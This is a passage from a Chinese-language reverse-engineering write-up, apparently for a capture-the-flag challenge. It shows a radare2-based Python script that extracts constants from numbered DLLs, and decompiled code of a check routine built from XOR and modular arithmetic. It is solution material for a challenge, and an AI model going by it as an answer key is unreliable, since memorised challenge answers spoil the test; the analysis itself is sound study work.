class="keyword">match</span>:</span><br><span class="line">                constants.append(<span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> constants</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python extract_const_check.py &lt;id&gt;    e.g., 0000&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    input_id = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_id.isdigit() <span class="keyword">or</span> <span class="built_in">len</span>(input_id) &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ID must be a numeric string (e.g., 0000, 123)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    id_str = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(input_id):04d&#125;</span>&quot;</span></span><br><span class="line">    dll_path = os.path.join(<span class="string">&quot;dlls&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>.dll&quot;</span>)</span><br><span class="line">    output_path = os.path.join(<span class="string">&quot;consts_check&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>_c.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(dll_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] DLL not found: <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    constants = analyze_check_function(dll_path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;[&quot;</span> + <span class="string">&quot;, &quot;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;c:016x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> constants) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>分析check后半段函数逻辑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tag1 = <span class="number">0xDC37C0E304978087uLL</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = v87[<span class="number">2</span> * i + <span class="number">121</span>];</span><br><span class="line">  v2 = &amp;v87[<span class="number">2</span> * i + <span class="number">120</span>];</span><br><span class="line">  *v2 ^= *(_QWORD *)&amp;a1[<span class="number">2</span> * (i % <span class="number">4</span>)];</span><br><span class="line">  v2[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;v87[<span class="number">2</span> * i + <span class="number">120</span>] &gt;= tag1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此部分中v1实际上是前16个oword的高位，v2是其低位，v2与a1进行循环xor，xor的结果写回v2，即a1中的任何值在xor运算后的结果均不能大于等于tag1的值，这里先patch中间值以通过校验，继续查看，下面是数轮循环：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0u</span>;</span><br><span class="line">v4 = cnt1[<span class="number">0</span>];</span><br><span class="line">v5 = cnt1[<span class="number">5</span>];</span><br><span class="line">v85 = cnt1[<span class="number">15</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v5;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v6 = cnt1[<span class="number">6</span>];</span><br><span class="line">v85 = cnt1[<span class="number">13</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v6;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out2 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v7 = cnt1[<span class="number">7</span>];</span><br><span class="line">v85 = cnt1[<span class="number">14</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v7;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out3 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v8 = cnt1[<span class="number">13</span>];</span><br><span class="line">v85 = cnt1[<span class="number">7</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v8;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out4 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v9 = cnt1[<span class="number">14</span>];</span><br><span class="line">v85 = cnt1[<span class="number">5</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v9;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out5 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v11 = cnt1[<span class="number">15</span>];</span><br><span class="line">v85 = cnt1[<span class="number">6</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v11;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out5 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out4 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v12 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;out3 + tag1 - *(_OWORD *)&amp;v12;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out2 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out1 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v4;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v13 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;v13 + *(_OWORD *)&amp;count;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">count = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v14 = cnt1[<span class="number">1</span>];</span><br><span class="line">v15 = cnt1[<span class="number">4</span>];</span><br><span class="line">v85 = cnt1[<span class="number">15</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v15;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out1_1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v16 = cnt1[<span class="number">6</span>];</span><br><span class="line">v85 = cnt1[<span class="number">12</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v16;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out2_1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v17 = cnt1[<span class="number">7</span>];</span><br><span class="line">v85 = cnt1[<span class="number">14</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v17;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out3_1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v18 = cnt1[<span class="number">12</span>];</span><br><span class="line">v85 = cnt1[<span class="number">7</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v18;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out4_1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v19 = cnt1[<span class="number">14</span>];</span><br><span class="line">v85 = cnt1[<span class="number">4</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v19;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">out5_1 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v21 = cnt1[<span class="number">15</span>];</span><br><span class="line">v85 = cnt1[<span class="number">6</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v21;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out5_1 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out4_1 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v22 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;out3_1 + tag1 - *(_OWORD *)&amp;v22;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out2_1 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;out1_1 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v14;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v23 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;count + tag1 - *(_OWORD *)&amp;v23;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">count = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v24 = cnt1[<span class="number">2</span>];</span><br><span class="line">v25 = cnt1[<span class="number">4</span>];</span><br><span class="line">v85 = cnt1[<span class="number">15</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v25;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v81 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v26 = cnt1[<span class="number">5</span>];</span><br><span class="line">v85 = cnt1[<span class="number">12</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v26;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v77 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v27 = cnt1[<span class="number">7</span>];</span><br><span class="line">v85 = cnt1[<span class="number">13</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v27;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v73 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v28 = cnt1[<span class="number">12</span>];</span><br><span class="line">v85 = cnt1[<span class="number">7</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v28;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v68 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v29 = cnt1[<span class="number">13</span>];</span><br><span class="line">v85 = cnt1[<span class="number">4</span>] * cnt1[<span class="number">11</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v29;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v30 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v31 = cnt1[<span class="number">15</span>];</span><br><span class="line">v85 = cnt1[<span class="number">5</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v31;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v30 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v68 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v32 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;v73 + tag1 - *(_OWORD *)&amp;v32;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v77 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v81 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v24;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v33 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;v33 + *(_OWORD *)&amp;count;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">count = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v34 = cnt1[<span class="number">3</span>];</span><br><span class="line">v35 = cnt1[<span class="number">4</span>];</span><br><span class="line">v85 = cnt1[<span class="number">14</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v35;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v82 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v36 = cnt1[<span class="number">5</span>];</span><br><span class="line">v85 = cnt1[<span class="number">12</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v36;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v78 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v37 = cnt1[<span class="number">6</span>];</span><br><span class="line">v85 = cnt1[<span class="number">13</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v37;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v74 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v38 = cnt1[<span class="number">12</span>];</span><br><span class="line">v85 = cnt1[<span class="number">6</span>] * cnt1[<span class="number">9</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v38;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v69 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v39 = cnt1[<span class="number">13</span>];</span><br><span class="line">v85 = cnt1[<span class="number">4</span>] * cnt1[<span class="number">10</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v39;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v40 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v41 = cnt1[<span class="number">14</span>];</span><br><span class="line">v85 = cnt1[<span class="number">5</span>] * cnt1[<span class="number">8</span>];</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v41;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v40 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v69 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 